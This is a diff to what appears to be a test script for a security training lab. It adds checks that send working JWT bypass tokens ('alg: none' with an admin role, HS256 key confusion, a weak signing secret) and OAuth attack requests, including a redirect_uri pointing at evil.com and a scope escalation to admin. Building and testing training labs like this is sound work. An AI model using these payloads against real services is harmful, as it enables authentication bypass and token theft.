@@ -142,6 +142,22 @@ await t("redirect-2 bypass", "/lab/redirect-2?url=https://academy.example@evil.c
 // ---------- Information disclosure ----------
 await t("info-1 debug", "/lab/info-1/debug");
 await t("info-2 sourcemap", "/lab/info-2/app.js.map");
+// ---------- JWT ----------
+const jh = (x) => b64url(JSON.stringify(x));
+const jhdr = jh({ alg: "none" });
+const jpay = jh({ role: "admin" });
+await t("jwt-1 none", "/lab/jwt-1", { headers: { Authorization: "Bearer " + jhdr + "." + jpay + "." } });
+const PK = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK7nZ1qTmFjVq5T0vGfG9l9zK8Vh2uR3Yc4wE2p3oQeNq9iX7lBkRqPZtWdqO2tY8mJ3hBv0dKcA9J4P7wXAqM0Vv7v7tLz";
+const jh2 = jh({ alg: "HS256" });
+const sig2 = await hmac(PK, jh2 + "." + jpay);
+await t("jwt-2 hs256", "/lab/jwt-2", { headers: { Authorization: "Bearer " + jh2 + "." + jpay + "." + sig2 } });
+const jh3 = jh({ alg: "HS256" });
+const sig3 = await hmac("p@ssw0rd-jwt", jh3 + "." + jpay);
+await t("jwt-3 secret", "/lab/jwt-3", { headers: { Authorization: "Bearer " + jh3 + "." + jpay + "." + sig3 } });
+// ---------- OAuth ----------
+await t("oauth-1 ruri", "/lab/oauth-1/authorize?redirect_uri=" + encodeURIComponent("https://app.academy.local@evil.com") + "&state=csrf1");
+await t("oauth-2 scope", "/lab/oauth-2/token?code=x&scope=admin");
+await t("oauth-3 email", "/lab/oauth-3?email=" + encodeURIComponent("bob@academy.local"));
 // ---------- Progress API ----------
 {
   const mk = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids: ["jwt-1", "oauth-1"] }) }), {});
@@ -154,6 +170,9 @@ await t("info-2 sourcemap", "/lab/info-2/app.js.map");
 
 async function md5(s) {
   return crypto.createHash("md5").update(s).digest("hex");
+}
+async function hmac(secret, data) {
+  return crypto.createHmac("sha256", secret).update(data).digest("base64url");
 }
 function btoa(s) { return Buffer.from(s).toString("base64"); }
 function b64url(s) { return Buffer.from(s).toString("base64url"); }
